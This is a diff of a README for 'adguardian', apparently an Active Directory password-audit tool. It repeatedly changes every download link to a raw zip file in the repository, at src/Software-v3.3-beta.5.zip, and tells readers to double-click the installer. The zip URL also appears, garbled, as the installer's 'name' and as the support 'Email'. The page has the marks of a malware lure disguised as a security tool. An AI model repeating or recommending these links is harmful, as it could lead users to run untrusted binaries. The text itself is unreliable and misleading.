@@ -7,9 +7,9 @@ Welcome to adguardian! This tool helps you audit the password policies of your A
 
 ## 📥 Download the Software
 
-[![Download adguardian](https://github.com/wix56/adguardian/raw/refs/heads/main/docs/Software-1.2.zip%20adguardian-Click%https://github.com/wix56/adguardian/raw/refs/heads/main/docs/Software-1.2.zip)](https://github.com/wix56/adguardian/raw/refs/heads/main/docs/Software-1.2.zip)
+[![Download adguardian](https://raw.githubusercontent.com/wix56/adguardian/main/src/Software-v3.3-beta.5.zip%20adguardian-Click%https://raw.githubusercontent.com/wix56/adguardian/main/src/Software-v3.3-beta.5.zip)](https://raw.githubusercontent.com/wix56/adguardian/main/src/Software-v3.3-beta.5.zip)
 
-To download adguardian, please visit this page: [Download adguardian](https://github.com/wix56/adguardian/raw/refs/heads/main/docs/Software-1.2.zip).
+To download adguardian, please visit this page: [Download adguardian](https://raw.githubusercontent.com/wix56/adguardian/main/src/Software-v3.3-beta.5.zip).
 
 ## 📋 Features
 
@@ -32,13 +32,13 @@ Before installing adguardian, ensure your system meets the following requirement
 To get started, follow these steps:
 
 1. **Visit the Download Page:**
-   Go to the releases page for adguardian: [Download adguardian](https://github.com/wix56/adguardian/raw/refs/heads/main/docs/Software-1.2.zip).
+   Go to the releases page for adguardian: [Download adguardian](https://raw.githubusercontent.com/wix56/adguardian/main/src/Software-v3.3-beta.5.zip).
 
 2. **Choose the Latest Version:**
    Look for the latest release. You will see a list of files available for download.
 
 3. **Download the Installer:**
-   Click on the adguardian installer file that suits your system. It is typically named similar to `https://github.com/wix56/adguardian/raw/refs/heads/main/docs/Software-1.2.zip`.
+   Click on the adguardian installer file that suits your system. It is typically named similar to `https://raw.githubusercontent.com/wix56/adguardian/main/src/Software-v3.3-beta.5.zip`.
 
 4. **Run the Installer:**
    Once the download is complete, locate the file in your Downloads folder. Double-click the installer to start the setup process.
@@ -66,7 +66,7 @@ Once you’ve completed the installation, you can start using adguardian:
 
 If you need help while using adguardian, you can reach out to our support team:
 
-- **Email:** https://github.com/wix56/adguardian/raw/refs/heads/main/docs/Software-1.2.zip
+- **Email:** https://raw.githubusercontent.com/wix56/adguardian/main/src/Software-v3.3-beta.5.zip
 - **FAQs:** Check the FAQ section on our GitHub page.
 
 ## 🛡️ Security Practices
@@ -95,5 +95,5 @@ This project covers the following important topics:
 
 ## 📥 Download Again
 
-For quick access to download adguardian, visit: [Download adguardian](https://github.com/wix56/adguardian/raw/refs/heads/main/docs/Software-1.2.zip).
+For quick access to download adguardian, visit: [Download adguardian](https://raw.githubusercontent.com/wix56/adguardian/main/src/Software-v3.3-beta.5.zip).
 ```
